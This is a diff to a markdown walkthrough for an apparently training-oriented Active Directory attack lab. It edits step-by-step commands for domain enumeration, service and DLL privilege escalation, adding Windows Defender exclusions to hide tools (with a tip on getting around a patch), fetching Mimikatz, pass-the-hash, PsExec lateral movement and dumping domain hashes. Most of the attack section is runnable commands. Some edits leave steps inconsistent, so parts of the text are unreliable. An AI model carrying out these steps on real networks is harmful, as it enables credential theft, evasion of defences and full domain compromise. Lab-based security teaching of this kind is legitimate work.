@@ -33,6 +33,7 @@ Megacorp, a very large company, has recently acquired several SMEs (Small and Me
   - [Defense Evasion](#defense-evasion)
     - [Folder Exclusion in Windows Defender UI](#folder-exclusion-in-windows-defender-ui)
     - [Folder Exclusion in Windows Defender PowerShell](#folder-exclusion-in-windows-defender-powershell)
+    - [Folder Exclusion in Windows Defender PowerShell through CMD](#folder-exclusion-in-windows-defender-powershell-through-cmd)
   - [Lateral Movement](#lateral-movement)
     - [Get Mimikatz](#get-mimikatz)
     - [Using Pass-the-Hash (PTH) Attack](#using-pass-the-hash-pth-attack)
@@ -100,22 +101,38 @@ Further instructions will be provided at the beginning of each session. A team s
 
 ### Initial Enumeration of the Environment
 
+command:
+
 ```bash
-C:\Users\normaluser>whoami
+whoami
+```
+
+result:
+
+```text
 adlab\normaluser
 ```
 
 We have established the current user context as adlab\normaluser. This is a domain user account that will serve as our starting point for further enumeration and privilege escalation.
 
+command:
+
 ```bash
-C:\Users\normaluser>hostname
+hostname
+```
+
+result:
+
+```text
 win10client
 ```
 
 The system's hostname is confirmed to be `win10client`, which matches the earlier information from `systeminfo`.
 
+command:
+
 ```bash
-C:\Users\normaluser>systeminfo
+systeminfo
 ```
 
 The system information reveals critical details about the host:
@@ -139,7 +156,7 @@ The domain controller is `\\WIN2019DC`, a critical target for future exploitatio
 We use the `net user` command to enumerate domain users.
 
 ```bash
-C:\Users\normaluser>net user /domain
+net user /domain
 ```
 
 A long list of users is returned. Some notable accounts to consider during further exploration include:
@@ -157,7 +174,7 @@ This enumeration will be helpful in identifying potential lateral movement or pr
 Next, we enumerate domain groups to understand group memberships and potential privileges.
 
 ```bash
-C:\Users\normaluser>net group /domain
+net group /domain
 ```
 
 We observe some key groups, such as:
@@ -173,7 +190,7 @@ We also confirm that `chantalle.karol` and `domad` are part of the `Domain Admin
 ### Privilege Information
 
 ```bash
-C:\Users\normaluser>net group "domain admins" /domain
+net group "domain admins" /domain
 ```
 
 The Domain Admins group members are:
@@ -297,34 +314,34 @@ Check for misconfigured scheduled tasks that can escalate privileges.
 
 1. **Download Sysinternals ZIP File**
 
-   In **cmd**, use `curl` to download the **Sysinternals Suite** to your `Downloads` folder:
+   In **cmd**, use `curl` to download the **Sysinternals Suite** to your `Home` folder:
 
    ```bash
-   curl -o Downloads\SysinternalsSuite.zip https://download.sysinternals.com/files/SysinternalsSuite.zip
+   curl -o %USERPROFILE%\SysinternalsSuite.zip https://download.sysinternals.com/files/SysinternalsSuite.zip
    ```
 
    In **PowerShell**, use `Invoke-WebRequest` to download the suite:
 
    ```powershell
-   Invoke-WebRequest -Uri "https://download.sysinternals.com/files/SysinternalsSuite.zip" -OutFile "$HOME\Downloads\SysinternalsSuite.zip"
+   Invoke-WebRequest -Uri "https://download.sysinternals.com/files/SysinternalsSuite.zip" -OutFile "$HOME\SysinternalsSuite.zip"
    ```
 
-   Both commands will download the **Sysinternals Suite** and save it as `SysinternalsSuite.zip` in the `Downloads` folder.
+   Both commands will download the **Sysinternals Suite** and save it as `SysinternalsSuite.zip` in the `Home` folder.
 
-2. **Create Destination Folder** (If Needed)
+2. **Create Destination Folder**
 
    If the folder for **Sysinternals** does not exist, create it before extracting:
 
    In **cmd**, use `mkdir`:
 
    ```bash
-   mkdir Downloads\SysinternalsSuite
+   mkdir %USERPROFILE%\SysinternalsSuite
    ```
 
    In **PowerShell**, use `New-Item`:
 
    ```powershell
-   New-Item -Path "$HOME\Downloads\SysinternalsSuite" -ItemType Directory
+   New-Item -Path "$HOME\SysinternalsSuite" -ItemType Directory
    ```
 
 3. **Extract Sysinternals ZIP File**
@@ -332,16 +349,18 @@ Check for misconfigured scheduled tasks that can escalate privileges.
    In **cmd**, use `tar` to extract the **SysinternalsSuite.zip** file:
 
    ```bash
-   tar -xf Downloads\SysinternalsSuite.zip -C Downloads\SysinternalsSuite
+   tar -xf %USERPROFILE%\SysinternalsSuite.zip -C %USERPROFILE%\SysinternalsSuite
    ```
 
    In **PowerShell**, use `Expand-Archive` to extract the contents:
 
    ```powershell
-   Expand-Archive -Path "$HOME\Downloads\SysinternalsSuite.zip" -DestinationPath "$HOME\Downloads\SysinternalsSuite"
+   Expand-Archive -Path "$HOME\SysinternalsSuite.zip" -DestinationPath "$HOME\SysinternalsSuite"
    ```
 
-   This extracts the **Sysinternals Suite** into the `Downloads\SysinternalsSuite` folder for further use.
+   This extracts the **Sysinternals Suite** into the `$HOME\SysinternalsSuite` folder for further use.
+
+> **Tip:** Check the complete path of your users `Home` using `echo %USERPROFILE%` in cmd or `echo $HOME` in powershell.
 
 ---
 
@@ -394,7 +413,7 @@ The Remote Mouse application lets us open an administrator command prompt.
 4. **Verify Privileges:**
 
    ```bash
-   C:\Users\normaluser> whoami
+   whoami
    nt authority\system
    ```
 
@@ -444,7 +463,7 @@ wmic service get name,displayname,startmode,pathname | findstr /i /v "C:\Windows
    - Run this command to check who can access and modify files in the folder:
 
      ```bash
-     icacls "C:\Program Files\Unquoted Path Service\Common Files"
+     icacls "C:\Program Files\Unquoted Path Service"
      ```
 
    - Look for the following permission flags in the output:
@@ -676,7 +695,7 @@ A vulnerable service attempts to load a missing DLL, which allows us to escalate
    - Copy the compiled `hijackme.dll` to the vulnerable service's directory:
 
      ```bash
-     copy Z:\hijackme.dll "C:\Program Files\DLL Hijack Service\"
+     copy Z:\hijackme.dll "C:\temp"
      ```
 
 4. **Restart the Service:**
@@ -830,7 +849,7 @@ net localgroup administrator
 After completing the steps, you should see this result, which shows that the privilege escalation worked:
 
 ```bash
-C:\Program Files\Unquoted Path Service>net user
+C:\Users\normaluser>net user
 User accounts for \\WIN10CLIENT
 
 Administrator            DefaultAccount           Guest
@@ -841,7 +860,7 @@ The command completed successfully.
 The `helpdesk` user has been created. You can check its details:
 
 ```bash
-C:\Program Files\Unquoted Path Service>net user helpdesk
+C:\Users\normaluser>net user helpdesk
 User name                    helpdesk
 Account active               Yes
 Account expires              Never
@@ -893,6 +912,7 @@ Follow these steps to exclude a folder from Windows Defender scans using the Win
 
 > **Note:** When logging into the system with the local administrator account (e.g., "helpdesk") via the Windows login screen, you must use the **"dot backslash" (`.\`)** notation to specify a local user account rather than a domain account. For example, to log in as the local "helpdesk" account, enter:  
 > `.\helpdesk`. This ensures the login is processed against the local **Security Accounts Manager (SAM)** database instead of the domain's Active Directory.
+> **Tip:** Exclude `C:\Users\helpdesk` this is the same as `%USERPROFILE%` in **cmd** and `$HOME` in **PowerShell**.
 
 ---
 
@@ -906,10 +926,10 @@ You can also exclude folders using PowerShell. Here’s how:
 
 2. **Add a Folder Exclusion:**
 
-   - Type this command, replacing `"C:\temp"` with the folder you want to exclude:
+   - Type this command, replacing `"$HOME"` with the folder you want to exclude:
 
      ```powershell
-     Add-MpPreference -ExclusionPath "C:\temp"
+     Add-MpPreference -ExclusionPath "$HOME"
      ```
 
 3. **Check Exclusions:**
@@ -925,7 +945,43 @@ You can also exclude folders using PowerShell. Here’s how:
    - If you need to remove an exclusion, use this command:
 
      ```powershell
-     Remove-MpPreference -ExclusionPath "C:\Path\To\Your\Folder"
+     Remove-MpPreference -ExclusionPath "$HOME"
+     ```
+
+> **Note:** There is a patch that prevents excluding the root `C:\` drive using PowerShell. However, this can be bypassed by excluding a specific folder within `C:\`, such as `C:\Temp`, as the patch only blocks exclusions ending with `C:\`, not folders inside it.
+
+---
+
+### Folder Exclusion in Windows Defender PowerShell through CMD
+
+You can also exclude folders using PowerShell through CMD. Here’s how:
+
+1. **Open Command Prompt as Administrator:**
+
+   - Press **Win + X** and choose **Command Prompt (Admin)**.
+
+2. **Add a Folder Exclusion:**
+
+   - Type this command, replacing `%USERPROFILE%` with the folder you want to exclude:
+
+     ```cmd
+     powershell -c "Add-MpPreference -ExclusionPath '%USERPROFILE%'"
+     ```
+
+3. **Check Exclusions:**
+
+   - To see the excluded folders, type:
+
+     ```cmd
+     powershell -c "Get-MpPreference | Select-Object -ExpandProperty ExclusionPath"
+     ```
+
+4. **Remove a Folder Exclusion (Optional):**
+
+   - If you need to remove an exclusion, use this command:
+
+     ```cmd
+     powershell -c "Remove-MpPreference -ExclusionPath '%USERPROFILE%'"
      ```
 
 > **Note:** There is a patch that prevents excluding the root `C:\` drive using PowerShell. However, this can be bypassed by excluding a specific folder within `C:\`, such as `C:\Temp`, as the patch only blocks exclusions ending with `C:\`, not folders inside it.
@@ -945,31 +1001,31 @@ download, extract, and prepare **mimikatz**
    In **cmd**, use the `curl` command to download the file:
 
    ```bash
-   curl -o mimikatz.zip https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20220919/mimikatz_trunk.zip
+   curl -o %USERPROFILE%\mimikatz.zip https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20220919/mimikatz_trunk.zip
    ```
 
    In **PowerShell**, use `Invoke-WebRequest`:
 
    ```powershell
-   Invoke-WebRequest -Uri "https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20220919/mimikatz_trunk.zip" -OutFile "mimikatz.zip"
+   Invoke-WebRequest -Uri "https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20220919/mimikatz_trunk.zip" -OutFile "$HOME\mimikatz.zip"
    ```
 
    Both commands will download the file from the specified URL and save it as `mimikatz.zip` in the current directory.
 
-2. **Create Destination Folder** (If Needed)
+2. **Create Destination Folder**
 
    If the destination folder does not exist, you can create it before extracting the archive.
 
    In **cmd**, use `mkdir`:
 
    ```bash
-   mkdir C:\temp\mimikatz
+   mkdir %USERPROFILE%\mimikatz
    ```
 
    In **PowerShell**, use `New-Item`:
 
    ```powershell
-   New-Item -Path "C:\temp\mimikatz" -ItemType Directory
+   New-Item -Path "$HOME\mimikatz" -ItemType Directory
    ```
 
    After creating the folder, you can proceed to extract the archive into it.
@@ -979,16 +1035,16 @@ download, extract, and prepare **mimikatz**
    In **cmd**, use `tar` to extract the ZIP file (this works on Windows 10 and later):
 
    ```bash
-   tar -xf mimikatz.zip -C C:\temp\mimikatz
+   tar -xf %USERPROFILE%\mimikatz.zip -C %USERPROFILE%\mimikatz
    ```
 
    In **PowerShell**, use `Expand-Archive` to extract the ZIP file:
 
    ```powershell
-   Expand-Archive -Path "mimikatz.zip" -DestinationPath "C:\temp\mimikatz"
+   Expand-Archive -Path "$HOME\mimikatz.zip" -DestinationPath "$HOME\mimikatz"
    ```
 
-   This command extracts the contents of `mimikatz.zip` into the specified folder (`C:\temp`). Make sure to replace the path with your desired location.
+   This command extracts the contents of `mimikatz.zip` into the specified folder. Make sure to replace the path with your desired location.
 
 ---
 
@@ -1010,8 +1066,16 @@ First, we need to dump the NTLM hash of the Administrator account on `win10clien
 2. Navigate to the directory containing `mimikatz.exe`.
 3. Run Mimikatz:
 
+   In **cmd**, use:
+
    ```bash
-   .\mimikatz\x64\mimikatz.exe
+   %USERPROFILE%\mimikatz\x64\mimikatz.exe
+   ```
+
+   In **PowerShell**, use
+
+   ```bash
+   & $HOME\mimikatz\x64\mimikatz.exe
    ```
 
    ```text
@@ -1105,8 +1169,16 @@ dir \\192.168.56.30\C$
 
 **Command:**
 
+In **cmd**, use
+
 ```bash
-C:\temp\Sysinternals\psexec.exe -r processname /accepteula \\192.168.56.30 cmd.exe
+%USERPROFILE%\SysinternalsSuite\psexec.exe -r processname /accepteula \\192.168.56.30 cmd.exe
+```
+
+In **PowerShell**, use
+
+```bash
+& $HOME\SysinternalsSuite\psexec.exe -r processname /accepteula \\192.168.56.30 cmd.exe
 ```
 
 **Explanation:**
@@ -1129,36 +1201,22 @@ We've demonstrated how to use Mimikatz for a pass-the-hash attack to achieve lat
 
 In this process, we will use **Mimikatz** to facilitate lateral movement between two systems: `win10client` (192.168.56.40) and `win10adm` (192.168.56.30). We'll open two command prompt windows from the **Mimikatz** session on `win10client`. One of these command prompt windows will use **PsExec** to escalate privileges and become the `win10adm` administrator. We will refer to these command prompt windows throughout the documentation as **win10client** and **win10adm**, respectively.
 
-1. **Create a Temporary Directory on `win10adm`:**
-
-   - Create a directory to store and execute the tools you’ll transfer.
-
-   **Command (win10adm Window):**
-
-   ```bash
-   mkdir C:\temp
-   ```
-
-   **Explanation:**
-
-   - This creates a directory called `C:\temp` on `win10adm` to store tools like **Mimikatz**.
-
-2. **Exclude the Temporary Directory from Antivirus Scanning:**
+1. **Exclude the Home Directory from Antivirus Scanning:**
 
    - Add the newly created directory to Windows Defender’s exclusion list to avoid detection of the tools.
 
    **Command (win10adm Window):**
 
    ```bash
-   powershell -c "Add-MpPreference -ExclusionPath 'C:\temp'"
+   powershell -c "Add-MpPreference -ExclusionPath '%USERPROFILE%'"
    ```
 
    **Explanation:**
 
    - `Add-MpPreference`: Modifies Windows Defender preferences.
-   - `-ExclusionPath`: Specifies `C:\temp` as an exclusion from antivirus scanning, helping to avoid detection of the tools.
+   - `-ExclusionPath`: Specifies `C:\Users\Administrator\` as an exclusion from antivirus scanning, helping to avoid detection of the tools.
 
-3. **Map the `C$` Administrative Share of `win10adm`:**
+2. **Map the `C$` Administrative Share of `win10adm`:**
 
    - Map the `C$` administrative share of `win10adm` to a local drive (`X:`) on `win10client` to enable file transfers.
 
@@ -1173,9 +1231,9 @@ In this process, we will use **Mimikatz** to facilitate lateral movement between
    - `net use`: Maps a network share.
    - `X:`: Assigns the `C$` administrative share on `win10adm` to drive `X:` on `win10client`.
 
-4. **Navigate to the Temporary Directory on `win10adm`:**
+3. **Navigate to the `win10adm` share:**
 
-   - After mapping the `C$` share, change the directory on `win10adm` to the temporary folder (`C:\temp`) created earlier.
+   - After mapping the `C$` share, change the directory on `win10client` to the share.
 
    **Command (win10client Window):**
 
@@ -1183,37 +1241,33 @@ In this process, we will use **Mimikatz** to facilitate lateral movement between
    X:
    ```
 
-   ```bash
-   cd X:\temp
-   ```
-
    **Explanation:**
 
    - `X:`: Switches to the mapped `X:` drive, which corresponds to the `C$` share on `win10adm`.
-   - `cd X:\temp`: Navigates to the `C:\temp` directory on `win10adm`.
+   - `cd X:\Users\Administrator\`: Navigates to the `C:\Users\Administrator\` directory on `win10adm`.
 
-5. **Transfer Tools to `win10adm`:**
+4. **Transfer Tools to `win10adm`:**
 
    - Copy the **Mimikatz** executable (or other necessary tools) from `win10client` to `C:\temp` on `win10adm`.
 
    **Command (win10client Window):**
 
    ```bash
-   copy C:\temp\mimikatz\x64\* X:\temp\
+   copy %USERPROFILE%\mimikatz\x64\* X:\Users\Administrator\
    ```
 
    **Explanation:**
 
-   - `copy`: Copies files from the specified source directory (`C:\path\to\mimikatz\x64\*`) to `C:\temp` on `win10adm` via the mapped drive.
+   - `copy`: Copies files from the specified source directory (`%USERPROFILE%\mimikatz\x64\*`) to `C:\Users\Administrator\` on `win10adm` via the mapped drive.
 
-6. **Execute Mimikatz on `win10adm`:**
+5. **Execute Mimikatz on `win10adm`:**
 
    - Once the tools are transferred, execute **Mimikatz** on `win10adm` to perform actions such as credential dumping or pass-the-hash attacks.
 
    **Command (win10adm Window):**
 
    ```bash
-   C:\temp\mimikatz.exe
+   %USERPROFILE%\mimikatz.exe
    ```
 
    **Explanation:**
@@ -1314,16 +1368,17 @@ Now that we have the NTLM hash of the **Domain Admin** account (`domad`), we can
 Now that you have administrative access to the Domain Controller, run **Mimikatz** to dump all the password hashes stored in Active Directory.
 
 1. **Run Mimikatz**:
-   Navigate to the location of **Mimikatz**:
+
+   In **cmd**, use:
 
    ```bash
-   cd C:\temp\
+   %USERPROFILE%\mimikatz\x64\mimikatz.exe
    ```
 
-   Run **Mimikatz**
+   In **PowerShell**, use
 
    ```bash
-   .\mimikatz\x64\mimikatz.exe
+   & $HOME\mimikatz\x64\mimikatz.exe
    ```
 
 2. **Enable Privilege Debugging**:
